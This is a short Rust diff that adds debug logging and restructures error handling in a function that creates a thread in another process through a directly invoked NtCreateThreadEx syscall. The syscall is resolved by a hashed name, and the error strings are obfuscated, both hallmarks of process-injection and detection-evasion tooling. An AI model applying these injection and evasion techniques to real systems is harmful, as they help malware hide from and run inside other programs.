@@ -9,6 +9,8 @@ pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) 
     let mut thread_handle: isize = 0;
     let nt_create_hash = crate::dbj2_hash!(b"NtCreateThreadEx");
 
+    crate::utils::write_debug_log(&format!("Attempting NtCreateThreadEx syscall, hash: {:#x}", nt_create_hash));
+
     let status = syscall!(
         nt_create_hash,
         NtCreateThreadExFn,
@@ -23,10 +25,19 @@ pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) 
         0usize,
         0usize,
         core::ptr::null_mut::<c_void>(),
-    ).ok_or_else(|| obfstr!("Failed to resolve NtCreateThreadEx").to_string())?;
+    );
 
-    if status < 0 {
-        return Err(format!("{}: {:#x}", obfstr!("NtCreateThreadEx failed"), status));
+    match status {
+        Some(s) => {
+            crate::utils::write_debug_log(&format!("NtCreateThreadEx syscall returned: {:#x}, handle: {:#x}", s, thread_handle));
+            if s < 0 {
+                return Err(format!("{}: {:#x}", obfstr!("NtCreateThreadEx failed"), s));
+            }
+        }
+        None => {
+            crate::utils::write_debug_log("NtCreateThreadEx syscall failed: get_syscall returned None");
+            return Err(obfstr!("Failed to resolve NtCreateThreadEx").to_string());
+        }
     }
 
     Ok(thread_handle)
